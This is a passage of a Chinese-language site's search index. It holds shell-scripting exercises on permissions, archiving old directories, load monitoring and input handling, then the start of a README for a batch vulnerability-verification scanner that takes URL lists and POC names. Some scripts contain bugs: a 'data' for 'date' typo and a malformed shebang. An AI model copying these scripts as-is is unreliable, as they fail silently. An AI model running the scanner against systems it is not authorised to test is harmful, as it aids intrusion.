$NF}'\u8868\u793a\u6253\u5370\u6bcf\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5\u3002\u5728df\u7684\u8f93\u51fa\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5\u901a\u5e38\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6302\u8f7d\u70b9\uff0c\u8fd9\u4e2a\u547d\u4ee4\u53ef\u80fd\u4f1a\u6253\u5370\u51fa\u6240\u6709\u975etmpfs\u6587\u4ef6\u7cfb\u7edf\u7684\u6302\u8f7d\u70b9\u3002</li> </ul>"},{"location":"Shell_Scripts/Day3/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>&amp;&amp; \u8fde\u63a5\u7b26\u8868\u793a\u5f53\u524d\u7684\u547d\u4ee4\u6267\u884c\u6210\u529f\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\uff0c\u5728\u4e0a\u4f8b\u4e2d\uff0c\u53ea\u6709\u4e24\u6761\u547d\u4ee4\u90fd\u6267\u884c\u6210\u529f\u4e86\uff0c\u8fd4\u56de\u503c\u624d\u662f0\uff0c\u5426\u5219\u4efb\u4f55\u4e00\u6761\u547d\u4ee4\u6267\u884c\u9519\u8bef\uff0c\u8fd4\u56de\u503c\u90fd\u4e3a\u975e0</li> <li>\u5199\u811a\u672c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u4e00\u8fb9\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c\u547d\u4ee4\u8c03\u8bd5\u4e00\u8fb9\u5199\u811a\u672c</li> <li>shell\u811a\u672c\u91ccsed,grep,awk\u65e0\u5904\u4e0d\u5728\u3002</li> </ol> <p>$? \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u53d8\u91cf\uff0c\u7528\u4e8e\u83b7\u53d6\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u7801\uff08\u6216\u79f0\u4e3a\u8fd4\u56de\u7801\uff09\u3002\u5728Unix/Linux\u7cfb\u7edf\u4e2d\uff0c\u9000\u51fa\u72b6\u6001\u7801\u4e3a0\u901a\u5e38\u8868\u793a\u6210\u529f\uff0c\u800c\u975e0\u5219\u8868\u793a\u5931\u8d25\u6216\u51fa\u73b0\u9519\u8bef\u3002</p> <p>\u56e0\u6b64\uff0cif [ $? -ne 0 ] \u8fd9\u4e2a\u6761\u4ef6\u8bed\u53e5\u7684\u610f\u601d\u662f\uff1a\u5982\u679c\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u7801\u4e0d\u7b49\u4e8e0\uff0c\u5373\u547d\u4ee4\u6267\u884c\u51fa\u73b0\u4e86\u95ee\u9898\u6216\u5931\u8d25\uff0c\u90a3\u4e48\u6267\u884c\u63a5\u4e0b\u6765\u7684\u64cd\u4f5c\u3002</p>"},{"location":"Shell_Scripts/Day4/index.html","title":"Index","text":"<ul> <li>\u68c0\u67e5/data/wwwroot/app\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u770b\u662f\u5426\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\u3002</li> <li>\u6240\u6709\u6587\u4ef6\u6743\u9650\u4e3a644</li> <li>\u6240\u6709\u76ee\u5f55\u6743\u9650\u4e3a755</li> <li>\u6587\u4ef6\u548c\u76ee\u5f55\u6240\u6709\u8005\u4e3awww\uff0c\u4e00\u5b9a\u8981\u6709\u5224\u65ad\u7684\u8fc7\u7a0b</li> <li>\u5982\u679c\u6587\u4ef6\u4e0d\u6ee1\u8db3\uff0c\u6539\u6210\u7b26\u5408\u8981\u6c42\uff0c\u6ce8\u610f\uff1a\u4e0d\u8981\u76f4\u63a5\u6539\u6743\u9650\uff0c\u4e00\u5b9a\u8981\u6709\u5224\u65ad\u7684\u8fc7\u7a0b</li> </ul> <pre><code>#!/bin/bash\n\ncd /data/wwwroot/app\n##\u904d\u5386\u6240\u6709\u76ee\u5f55\u548c\u6587\u4ef6\uff0c\u7528\"find .\"\u5373\u53ef\nfor f in `find .`\ndo\n    ##\u67e5\u770b\u6587\u4ef6\u6743\u9650\n    f_p=`stat -c %a $f`\n    ##\u67e5\u770b\u6587\u4ef6\u6240\u6709\u8005\n    f_u=`stat -c %U $f`\n    ##\u67e5\u770b\u6587\u4ef6\u6240\u5c5e\u7ec4\n    f_g=`stat -c %G $f`\n\n    ##\u5224\u65ad\u662f\u5426\u4e3a\u76ee\u5f55\n    if [ -d $f ]\n    then\n        [ $f_p != '755' ] &amp;&amp; chmod 755 $f\n    else\n        [ $f_p != '644' ] &amp;&amp; chmod 644 $f\n    fi\n\n    ##&amp;&amp;\u7528\u5728\u4e24\u6761\u547d\u4ee4\u4e2d\u95f4\uff0c\u53ef\u4ee5\u8d77\u5230if\u5224\u65ad\u7684\u4f5c\u7528\n    ##\u5f53\u7b2c\u4e00\u6761\u547d\u4ee4\u6210\u529f\uff0c\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\n    [ $f_u != 'www' ] &amp;&amp; chown www $f\n    [ $f_g != 'root' ] &amp;&amp; chown :root $f\ndone\n</code></pre>"},{"location":"Shell_Scripts/Day4/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>\u67e5\u770b\u6587\u4ef6\u6743\u9650\uff1a<code>stat -c %a 1.txt</code></li> <li>\u67e5\u770b\u6587\u4ef6\u6240\u5c5e\u7ec4\uff1a<code>stat -c %G 1.txt</code></li> <li>\u67e5\u770b\u6587\u4ef6\u6240\u6709\u8005\uff1a<code>stat -c %U 1.txt</code></li> <li>&amp;&amp;\u53ef\u4ee5\u5b9e\u73b0\uff1a\u5f53\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u6210\u529f\u518d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4</li> <li>||\u53ef\u4ee5\u5b9e\u73b0\uff1a\u5f53\u524d\u9762\u547d\u4ee4\u4e0d\u6210\u529f\u518d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4</li> </ol>"},{"location":"Shell_Scripts/Day5/index.html","title":"Index","text":"<ul> <li>\u6709\u4e00\u4e2a\u76ee\u5f55/data/att/\uff0c\u8be5\u76ee\u5f55\u4e0b\u6709\u6570\u767e\u4e2a\u5b50\u76ee\u5f55\uff0c\u6bd4\u5982/data/att/aming\uff0c/data/att/linux</li> <li>\u7136\u540e\u518d\u6df1\u5165\u4e00\u5c42\u4e3a\u4ee5\u65e5\u671f\u547d\u540d\u7684\u76ee\u5f55\uff0c\u6bd4\u5982/data/att/aming/20231009\uff0c</li> <li>\u6bcf\u5929\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65e5\u671f\u65b0\u76ee\u5f55\uff0c\u7531\u4e8e/data\u6240\u5728\u78c1\u76d8\u5feb\u6ee1\u4e86\uff0c</li> <li>\u6240\u4ee5\u9700\u8981\u5c06\u8001\u6587\u4ef6(\u4e00\u5e74\u4ee5\u524d\u7684)\u632a\u5230\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55/data1/att\u4e0b\uff0c</li> <li>\u793a\u4f8b\uff1amv /data/att/aming/20240428 /data1/att/aming/20240428</li> <li>\u632a\u5b8c\u4e4b\u540e\uff0c\u8fd8\u9700\u8981\u505a\u8f6f\u94fe\u63a5\uff0c</li> <li>\u793a\u4f8b\uff1aln -s /data1/att/aming/20240428  /data/att/aming/20240428</li> <li>\u5199\u4e00\u4e2a\u811a\u672c\uff0c\u8981\u6c42/data/att\u5199\u6240\u6709\u76ee\u5f55\u5b50\u76ee\u5f55\u90fd\u8981\u6309\u6b64\u64cd\u4f5c\uff0c</li> <li>\u811a\u672c\u4f1a\u6bcf\u592901\uff1a00\u6267\u884c\u4e00\u6b21\uff0c\u4efb\u52a1\u8ba1\u5212\u65e0\u9700\u8003\u8651\uff0c\u53ea\u9700\u8981\u5199\u811a\u672c\u5373\u53ef</li> <li>\u63d0\u9192\uff1a\u8981\u786e\u4fdd\u8001\u6587\u4ef6\u6210\u529f\u632a\u5230/data1/att\u4e0b\u4e4b\u540e\u624d\u80fd\u505a\u8f6f\u94fe\u63a5\uff0c\u9700\u8981\u6709\u65e5\u5fd7   <pre><code>#\uff01/bin/bash\n\n##\u5148\u5b9a\u4e49\u4e00\u4e2amain\u51fd\u6570\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u540e\u9762\u8c03\u7528\u51fd\u6570\uff0c\u65b9\u4fbf\u8bb0\u5f55\u65e5\u5fd7\nmain()\n{\n    cd /data/att\n    ## \u904d\u5386\u7b2c\u4e00\u5c42\u76ee\u5f55\n    for dir in `ls`\n    do\n        ## \u904d\u5386\u7b2c\u4e8c\u5c42\u76ee\u5f55\uff0c\u7528find\u53ea\u627e\u5f53\u524d\u76ee\u5f55\u4e00\u5e74\u4ee5\u524d\u7684\u5b50\u76ee\u5f55\n        for dir2 in `find $dir -maxdepth 1 -type d -mtime +365`\n        do\n            ## \u5c06\u76ee\u6807\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u540c\u6b65\u5230/data/att/\u76ee\u5f55\u4e0b\uff0c\u6ce8\u610f\u8fd9\u91cc\u7684-R\u53ef\u4ee5\u81ea\u52a8\u521b\u5efa\u76ee\u5f55\u7ed3\u6784\n            rsync -aR $dir2/  /data1/att/\n            if [ $? -eq 0 ]\n            then\n                ## \u5982\u679c\u540c\u6b65\u6210\u529f\uff0c\u4f1a\u5c06/data/att\u4e0b\u7684\u76ee\u5f55\u5220\u9664\n                rm -rf $dir2\n                echo \"/data/att/$dir2 \u79fb\u52a8\u6210\u529f\"\n                ## \u505a\u8f6f\u8fde\u63a5\n                ln -s /data1/att/$dir2 /data/att/$dir2  &amp;&amp; \\\n                echo \"/data/att/$dir2\u6210\u529f\u521b\u5efa\u8f6f\u94fe\u63a5\"\n                echo\n            else\n                echo \"/data/att/$dir \u672a\u79fb\u52a8\u6210\u529f\"\n            fi\n        done\n    done\n}\n\n## \u8c03\u7528main\u51fd\u6570\uff0c\u5e76\u5c06\u8f93\u51fa\u5199\u5165\u65e5\u5fd7\u91cc\uff0c  \u65e5\u5fd7\u6bcf\u5929\u4e00\u4e2a\nmain &amp;&gt; /tmp/move_old_data_`date +%F`.log\n</code></pre></li> </ul>"},{"location":"Shell_Scripts/Day5/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>\u53ef\u4ee5\u901a\u8fc7main\u51fd\u6570\u7684\u5f62\u5f0f\u6765\u65b9\u4fbf\u5b9a\u4e49\u811a\u672c\u65e5\u5fd7</li> <li>find \u4f7f\u7528-maxdepth\u5b9a\u4e49\u67e5\u627e\u76ee\u5f55\u5c42\u7ea7</li> <li>\u811a\u672c\u67d0\u884c\u5f88\u957f\u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\" + \u56de\u8f66\"\u6765\u6362\u884c\uff0c\u4f46\u672c\u8d28\u4e0a\u8fd8\u662f\u4e00\u884c\u5185\u5bb9</li> <li>rsync\u7684-R\u9009\u9879\u53ef\u4ee5\u81ea\u52a8\u7ea7\u8054\u521b\u5efa\u76ee\u5f55\u5c42\u7ea7</li> <li><code>find $dir -maxdepth 1 -type d -mtime +365</code>\uff1a\u7528\u4e8e\u67e5\u627e\u6307\u5b9a\u76ee\u5f55 dir \u4e0b\u4fee\u6539\u65f6\u95f4\u8d85\u8fc7 365 \u5929\u7684\u6240\u6709\u76ee\u5f55\uff0c$dir\u8868\u793a\u8981\u67e5\u627e\u7684\u76ee\u5f55\u7684\u8def\u5f84\uff0c-maxdepth 1\u6307\u5b9a\u641c\u7d22\u7684\u6700\u5927\u6df1\u5ea6\u4e3a1\uff0c\u5373\u53ea\u641c\u7d22\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u76f4\u63a5\u5b50\u76ee\u5f55\uff0c\u4e0d\u4f1a\u9012\u5f52\u5730\u641c\u7d22\u5b50\u76ee\u5f55\u7684\u5b50\u76ee\u5f55\u3002</li> <li><code>rsync -aR $dir2/  /data1/att/</code>\uff1a\u5c06\u6e90\u76ee\u5f55 $dir2 \u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u5b50\u76ee\u5f55\uff08\u4fdd\u6301\u539f\u6709\u76ee\u5f55\u7ed3\u6784\uff09\u540c\u6b65\u5230\u76ee\u6807\u76ee\u5f55 /data1/att/ \u4e0b\uff0c\u540c\u65f6\u4fdd\u6301\u6587\u4ef6\u7684\u6240\u6709\u7279\u6027\u3002</li> <li><code>if [ $? -eq 0 ]</code>\uff1a\u5982\u679c\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u9000\u51fa\u72b6\u6001\u7801\u4e3a 0\uff08\u5373\u547d\u4ee4\u6267\u884c\u6210\u529f\uff09\uff0c\u5219\u6267\u884c if \u8bed\u53e5\u4e2d\u7684\u4ee3\u7801\u5757\uff1b\u5426\u5219\uff0c\u6267\u884c\u4e0e if \u8bed\u53e5\u5173\u8054\u7684 else \u8bed\u53e5\u4e2d\u7684\u4ee3\u7801\u5757\u3002</li> </ol>"},{"location":"Shell_Scripts/Day6/index.html","title":"Index","text":"<ul> <li>\u5199\u4e00\u4e2a\u76d1\u63a7\u811a\u672c\uff0c\u76d1\u63a7\u7cfb\u7edf\u8d1f\u8f7d\uff0c\u5982\u679c\u7cfb\u7edf\u8d1f\u8f7d\u8d85\u8fc710\uff0c\u9700\u8981\u8bb0\u5f55\u7cfb\u7edf\u72b6\u6001\u4fe1\u606f\u3002</li> <li>\u7cfb\u7edf\u8d1f\u8f7d\u547d\u4ee4\u4f7f\u7528uptime\u67e5\u770b\uff0c\u8fc7\u53bb\u4e00\u5206\u949f\u7684\u5e73\u5747\u8d1f\u8f7d</li> <li>\u7cfb\u7edf\u72b6\u6001\u4f7f\u7528\u5982\u4e0b\u5de5\u5177\u6807\u8bb0\uff1atop\uff0cvmstat\uff0css</li> <li>\u8981\u6c42\u6bcf\u969420s\u76d1\u63a7\u4e00\u6b21</li> <li>\u7cfb\u7edf\u72b6\u6001\u4fe1\u606f\u9700\u8981\u4fdd\u5b58\u5230/opt/logs/\u4e0b\u9762\uff0c\u4fdd\u7559\u4e00\u4e2a\u6708\uff0c\u6587\u4ef6\u540d\u5efa\u8bae\u5e26\u6709<code>date +%s</code>\u540e\u7f00\u6216\u8005\u524d\u7f00   <pre><code>#!/bin/bash\n\n##\u9996\u5148\u770b/opt/logs\u76ee\u5f55\u5728\u4e0d\u5728\uff0c\u4e0d\u5728\u5c31\u521b\u5efa\n[ -d /opt/logs ] || mkdir -p /opt/logs\n##while\u6b7b\u5faa\u73af\nwhile :\ndo \n    ## \u83b7\u53d6\u7cfb\u7edf1\u5206\u949f\u7684\u8d1f\u8f7d\uff0c\u5e76\u4e14\u53ea\u53d6\u5c0f\u6570\u70b9\u524d\u9762\u7684\u6570\u5b57\n    load=`uptime |awk -F 'average:' '{print $2}'|cut -d',' -f1|sed 's/ //g' |cut -d. -f1`\n    # \u4f7f\u7528 uptime \u547d\u4ee4\u83b7\u53d6\u7cfb\u7edf\u8d1f\u8f7d\u4fe1\u606f\uff0c\u7136\u540e\u7528 awk \u4ece\u8f93\u51fa\u4e2d\u63d0\u53d6\u51fa\u8d1f\u8f7d\u503c\uff0c\n    # cut \u547d\u4ee4\u7528\u4e8e\u79fb\u9664\u9017\u53f7\u540e\u7684\u90e8\u5206\uff0csed \u547d\u4ee4\u7528\u4e8e\u53bb\u9664\u7a7a\u683c\uff0c\u6700\u540e cut \u547d\u4ee4\u7528\u4e8e\u63d0\u53d6\u5c0f\u6570\u70b9\u524d\u7684\u6574\u6570\u90e8\u5206\uff0c\n    # \u8d4b\u503c\u7ed9\u53d8\u91cf load\n    if [ $load -gt 10 ]\n    then \n        ##\u5206\u522b\u8bb0\u5f55top\uff0cvmstat\u548css\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c\n        top -bn1 | head -n 100 &gt; /opt/logs/top.`date +%s`\n        # \u6267\u884c top \u547d\u4ee4\u5e76\u5c06\u524d100\u884c\u8f93\u51fa\u4fdd\u5b58\u5230\u4ee5\u5f53\u524d\u65f6\u95f4\u6233\u547d\u540d\u7684\u6587\u4ef6\u4e2d\n        vmstat 1 10 &gt; /opt/logs/vmstat.`date +%s`\n        # \u6267\u884c vmstat \u547d\u4ee4\uff0c\u6bcf\u79d2\u91c7\u96c6\u4e00\u6b21\u6570\u636e\uff0c\u5171\u91c7\u96c610\u6b21\uff0c\u5e76\u5c06\u8f93\u51fa\u4fdd\u5b58\u5230\u4ee5\u5f53\u524d\u65f6\u95f4\u6233\u547d\u540d\u7684\u6587\u4ef6\u4e2d\n        ss -an &gt; /opt/logs/ss.`data +%s`\n        # \u6267\u884c ss \u547d\u4ee4\u4ee5\u83b7\u53d6\u5f53\u524d\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f\uff0c\u5e76\u5c06\u8f93\u51fa\u4fdd\u5b58\u5230\u4ee5\u5f53\u524d\u65f6\u95f4\u6233\u547d\u540d\u7684\u6587\u4ef6\u4e2d\n    fi\n    ##\u4f11\u772020\u79d2\n    sleep 20\n    ##\u627e\u523030\u5929\u4ee5\u524d\u7684\u65e5\u5fd7\u6587\u4ef6\u5220\u9664\u6389\n    find /opt/logs \\( -name \"top*\" -o -name \"vmstat*\" -o -name \"ss*\" \\) -mtime +30 |xargs rm -f\ndone\n</code></pre></li> </ul>"},{"location":"Shell_Scripts/Day6/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>||\u7528\u5728\u4e24\u6761\u547d\u4ee4\u4e2d\u95f4\uff0c\u53ef\u4ee5\u8d77\u5230\u8fd9\u6837\u7684\u6548\u679c\uff0c\u5f53\u524d\u9762\u547d\u4ee4\u4e0d\u6210\u529f\u5c31\u4f1a\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4</li> <li>\u6b7b\u5faa\u73af\u53ef\u4ee5\u4f7f\u7528while \uff1a+ sleep\u7ec4\u5408</li> <li>\u8fb9\u5199\u811a\u672c\u8fb9\u5728\u547d\u4ee4\u884c\u91cc\u8c03\u8bd5</li> <li>find\u91cc\u53ef\u4ee5\u4f7f\u7528\u5c0f\u62ec\u53f7\u5c06\u591a\u4e2a\u6761\u4ef6\u7ec4\u5408\u8d77\u6765\u5f53\u6210\u4e00\u4e2a\u6574\u4f53\u6765\u5904\u7406</li> </ol>"},{"location":"Shell_Scripts/Day7/index.html","title":"Index","text":"<ul> <li>\u6709\u4e00\u53f0\u670d\u52a1\u5668\u4f5c\u4e3aweb\u5e94\u7528\uff0c\u6709\u4e00\u4e2a\u76ee\u5f55(/data/web/attachment)</li> <li>\u4e0d\u5b9a\u65f6\u7684\u4f1a\u88ab\u7528\u6237\u4e0a\u4f20\u65b0\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u4f1a\u4e0a\u4f20</li> <li>\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981\u6ca1\u4e94\u5206\u949f\u505a\u4e00\u6b21\u68c0\u6d4b\u662f\u5426\u6709\u65b0\u6587\u4ef6\u751f\u6210</li> <li>\u5199\u4e00\u4e2ashell\u811a\u672c\u53bb\u5b8c\u6210\u68c0\u6d4b\uff0c\u68c0\u6d4b\u5b8c\u6210\u540e\u82e5\u662f\u6709\u65b0\u6587\u4ef6</li> <li>\u8fd8\u9700\u8981\u5c06\u65b0\u6587\u4ef6\u7684\u5217\u8868\u8f93\u51fa\u5230\u4e00\u4e2a\u6309\u5e74\uff0c\u6708\uff0c\u65e5\uff0c\u65f6\uff0c\u5206\u4e3a\u540d\u5b57\u7684\u65e5\u5fd7\u91cc</li> <li>\u601d\u8def\uff1a\u6bcf\u4e94\u5206\u949f\u68c0\u6d4b\u4e00\u6b21\uff0c\u90a3\u80af\u5b9a\u9700\u8981\u6709\u4e00\u4e2a\u8ba1\u5212\u4efb\u52a1\uff0c\u6bcf\u4e94\u5206\u949f\u53bb\u6267\u884c\u4e00\u6b21\uff0c\u811a\u672c\u68c0\u6d4b\u7684\u65f6\u5019\uff0c\u5c31\u662f\u4f7f\u7528find\u547d\u4ee4\u67e5\u627e5\u5206\u949f\u5185\u6709\u8fc7\u66f4\u65b0\u7684\u6587\u4ef6\uff0c\u82e5\u662f\u6709\u66f4\u65b0\uff0c\u90a3\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8f93\u51fa\u4e1c\u897f\uff0c\u5426\u5219\u662f\u6ca1\u6709\u8f93\u51fa\u7684\uff0c</li> </ul> <pre><code>#!/bin/bash\n\n##\u65e5\u5fd7\u6587\u4ef6\u540d\uff0c\u5305\u542b\u5e74\u6708\u65e5\u65f6\u5206\nd=`date +%Y%m%d%H%M`\nbasedir=/data/web/attachment\n\n##find\u627e\u52305\u5206\u949f\u4e4b\u5185\u65b0\u4ea7\u751f\u7684\u6587\u4ef6\uff0c\u5e76\u628a\u6587\u4ef6\u5217\u8868\u5199\u5165\u4e00\u4e2a\u6587\u4ef6\u4e2d\nfind $basedir/ -type f -mmin -5 &gt; /tmp/newf.txt\n\n## \u5982\u679c\u6587\u4ef6\u91cc\u6709\u5185\u5bb9\uff0c\u628a\u6587\u4ef6\u6539\u540d\u5b57\uff0c\u5373\u6211\u4eec\u8981\u7684\u6587\u4ef6\u5217\u8868\u65e5\u5fd7\u6587\u4ef6\nif [ -s /tmp/newf.txt ]; then\n    /bin/mv /tmp/newf.txt /tmp/$d\nfi\n</code></pre>"},{"location":"Shell_Scripts/Day7/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>find\u7684 -mmin \u9009\u9879\u4ee5\u5206\u949f\u4e3a\u65f6\u95f4\u5355\u4f4d\u67e5\u627e</li> <li>[ -s filename ] \u8868\u793a\u5f53\u6587\u4ef6\u5b58\u5728\uff0c\u5e76\u4e14\u6587\u4ef6\u5185\u5bb9\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u6761\u4ef6\u6210\u7acb</li> </ol>"},{"location":"Shell_Scripts/Day8/index.html","title":"Index","text":"<ul> <li>\u8f93\u5165\u4e00\u4e2a\u6570\u5b57\uff0c\u7136\u540e\u5141\u8bb8\u5bf9\u5e94\u7684\u4e00\u4e2a\u547d\u4ee4</li> <li>\u663e\u793a\u547d\u4ee4\u5982\u4e0b\uff1a<code>*cmd meau** 1-date 2-ls 3-who 4-pwd</code></li> <li>\u5f53\u8f93\u51651\u65f6\uff0c\u4f1a\u5141\u8bb8date\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002</li> </ul> <pre><code>#!/bin/bash\n\n##\u5148\u628a\u63d0\u793a\u8bed\u6253\u5370\u51fa\u6765\necho \"*cmd meau** 1-date 2-ls 3-who 4-pwd\"\n\n##\u4f7f\u7528\u6b7b\u5faa\u73af\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u5f53\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u5e76\u975e\u8981\u6c42\u7684\u5b57\u7b26\u65f6\uff0c\u4e0d\u80fd\u76f4\u63a5\u9000\u51fa\u811a\u672c\uff0c\u800c\u662f\u518d\u6b21\u5f00\u59cb\nwhile :\ndo\n  ##\u7136\u540e\u5f00\u59cb\u4f7f\u7528read\u5b9e\u73b0\u548c\u7528\u6237\u4ea4\u4e92\uff0c\u63d0\u793a\u8ba9\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6570\u5b57\n  read -p \"please input a number 1-4: \" n\n  case $n in\n      1)\n          date\n          ## \u4e4b\u6240\u4ee5\u8981break\uff0c\u662f\u56e0\u4e3a\u5f53\u7528\u6237\u6267\u884c\u5b8c\u547d\u4ee4\u5c31\u8981\u9000\u51fa\u4e86\n          break\n          ;;\n      2)\n          ls\n          break\n          ;;\n      3)\n          who\n          break\n          ;;\n      4)\n          pwd\n          break\n          ;;\n      *)\n          ##\u5982\u679c\u8f93\u5165\u7684\u4e0d\u662f1-4\u7684\u6570\u5b57\uff0c\u63d0\u793a\u51fa\u9519\n          echo \"Wrong input  try again!\"\n          ;;\n  esac\ndone\n</code></pre>"},{"location":"Shell_Scripts/Day8/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>read -p \u53ef\u4ee5\u5728shell\u811a\u672c\u4e2d\u5b9e\u73b0\u548c\u7528\u6237\u4ea4\u4e92\u7684\u6548\u679c</li> <li>case ... esac \u8fd9\u79cd\u903b\u8f91\u5224\u65ad\u7528\u6cd5\uff0c\u975e\u5e38\u9002\u5408\u505a\u9009\u62e9\u9898\uff0c\u5c24\u5176\u662f\u9009\u9879\u5f88\u591a\u65f6\uff0c\u9009\u9879\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u503c\uff0c\u6bd4\u59821|5</li> <li>\u5982\u679c\u60f3\u8981\u53cd\u590d\u548c\u7528\u6237\u4ea4\u4e92\uff0c\u5fc5\u987b\u4f7f\u7528while\u5faa\u73af\uff0c\u5e76\u501f\u52a9break\u6216\u8005continue\u6765\u63a7\u5236\u5faa\u73af\u6d41\u7a0b</li> <li>break\u8868\u793a\u9000\u51fa\u5faa\u73af\u4f53\uff0ccontinue\u8868\u793a\u7ed3\u675f\u672c\u6b21\u5faa\u73af\uff0c\u8fdb\u5165\u4e0b\u6b21\u5faa\u73af</li> </ol>"},{"location":"Shell_Scripts/Day9/index.html","title":"Index","text":"<ul> <li>\u5199\u4e00\u4e2a\u811a\u672c\uff0c\u6267\u884c\u540e\uff0c\u6253\u5370\u4e00\u884c\u63d0\u793a\"please input a number: \"</li> <li>\u8981\u6c42\u7528\u6237\u8f93\u5165\u6570\u503c\uff0c\u7136\u540e\u6253\u5370\u51fa\u8be5\u6570\u503c\uff0c\u7136\u540e\u518d\u6b21\u8981\u6c42\u7528\u6237\u8f93\u5165\u6570\u503c\uff0c\u77e5\u9053\u7528\u6237\u8f93\u5165end\u505c\u6b62   <pre><code>#!/bin/bash\n\n##\u6b7b\u5faa\u73af\uff0c\u505a\u5230\u8ba9\u7528\u6237\u53cd\u590d\u8f93\u5165\nwhile :\ndo\n    ##\u63d0\u793a\u8bed\n    read -p \"Please input a number:(Input \"end\" to quit) \" n\n    ##\u4f7f\u7528sed\u5c06\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e2d\u6570\u5b57\u66ff\u6362\u4e3a\u7a7a\uff0c\u5982\u679c\u662f\u7eaf\u6570\u5b57\uff0c\u90a3\u4e48num\u7684\u503c\u4e3a1\n    ##\u4e3a\u4ec0\u4e48\u662f1\u800c\u4e0d\u662f0\u5462\uff0c\u56e0\u4e3awc -c\u4f1a\u628a\u56de\u8f66\u4e5f\u6807\u8bb0\u4e3a\u4e00\u4e2a\u5b57\u7b26\n    num=`echo $n |sed -r 's/[0-9]//g'|wc -c`\n    if [ $n == \"end\" ]\n    then\n        exit\n    fi\n    if [ $num -ne 1 ]\n    then\n        echo \"What you input is not a number! Try again!\"\n    else\n        echo \"The number you entered is: $n\"\n    fi\ndone\n</code></pre></li> </ul>"},{"location":"Shell_Scripts/Day9/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>wc -c\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\u5176\u4e2d\u56de\u8f66\u4e5f\u7b97\u662f\u4e00\u4e2a\u5b57\u7b26</li> <li>\u4f7f\u7528sed 's/[0-9]//g'\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u91cc\u7684\u6570\u5b57\u5220\u9664</li> <li>exit\u9000\u51fa\u811a\u672c</li> </ol>"},{"location":"Tools/index.html","title":"Tools","text":"<ul> <li>\u6f0f\u6d1e\u6279\u91cf\u9a8c\u8bc1\u5de5\u5177</li> </ul>"},{"location":"Tools/Tool/Tool-1/index.html","title":"README","text":""},{"location":"Tools/Tool/Tool-1/index.html#_1","title":"\u6f0f\u6d1e\u626b\u63cf\u7a0b\u5e8f","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6f0f\u6d1e\u626b\u63cf\u7a0b\u5e8f\uff0c\u7528\u4e8e\u68c0\u6d4b\u7ed9\u5b9a\u7684 URL \u662f\u5426\u5b58\u5728\u7279\u5b9a\u6f0f\u6d1e\u3002</p>"},{"location":"Tools/Tool/Tool-1/index.html#_2","title":"\u4f7f\u7528\u6307\u5357","text":""},{"location":"Tools/Tool/Tool-1/index.html#github","title":"Github","text":"<p>https://github.com/hypnoticp/Python_script</p>"},{"location":"Tools/Tool/Tool-1/index.html#_3","title":"\u51c6\u5907\u73af\u5883","text":"<p>Python 3</p>"},{"location":"Tools/Tool/Tool-1/index.html#_4","title":"\u547d\u4ee4\u53c2\u6570","text":"<pre><code>python3 main.py -h\nusage: main.py [-h] [-f FILE] [-u URL] [-p POC] [-t THREAD] [-type TYPE]\noptional arguments:\n  -h, --help            show this help message and exit\n  -f FILE, --file FILE  url\u6587\u4ef6\u8def\u5f84\n  -u URL, --url URL     \u4e3b\u673a\u5730\u5740\n  -p POC, --poc POC     poc\u540d,\u591a\u4e2a\u4ee5\u9017\u53f7\u9694\u5f00,\u652f\u6301*\u53f7\u6a21\u7cca\u5339\u914d\n  -t THREAD, --thread THREAD\n                        \u7ebf\u7a0b\u6570\u91cf(\u9ed8\u8ba41500,\u6570\u91cf\u8d8a\u4f4e\uff0c\u51c6\u786e\u7387\u8d8a\u9ad8)\n  -type TYPE            \u6307\u5b9a\u6f0f\u6d1e\u7c7b\u578b\u76ee\u5f55\n</code></pre> <p>-u \u6216 -f \u4e3a\u5fc5\u586b\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u5355\u4e2a URL \u6216 URL 